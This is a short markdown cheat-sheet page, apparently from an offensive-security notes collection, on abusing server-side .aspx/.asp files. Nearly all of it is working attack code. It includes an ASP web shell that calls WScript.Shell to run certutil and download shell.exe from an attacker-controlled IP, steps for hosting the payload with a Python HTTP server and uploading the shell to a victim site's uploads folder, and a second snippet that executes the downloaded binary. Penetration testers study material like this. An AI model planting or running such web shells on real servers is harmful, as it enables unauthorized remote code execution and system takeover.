# Active Server Pages Extended (.aspx) Misuse

```
Description: Active Server Pages Extended (.aspx) is a file extension used by ASP.NET
A server-side script file used to build dynamic web pages and web applications before React/Angular
When a user visits http://example.com/page.aspx, server processes code inside .aspx file and sends only HTML output back to user's browser

# Prepare the ASP File named shell.aspx
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>

# Host shell.exe on your attacking machine in current directory
python3 -m http.server 80

# Upload shell.asp to Target Server
http://victim.com/uploads/shell.asp
```

# Victim Machine
```
# Once visit website and trigger the ASP Script
# Run certutil.exe on victim to download shell.exe
# Save it to C:\Windows\Temp\shell.exe

# if not do above, Execute a File
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

## Back to README.md
[BACK](../README.md)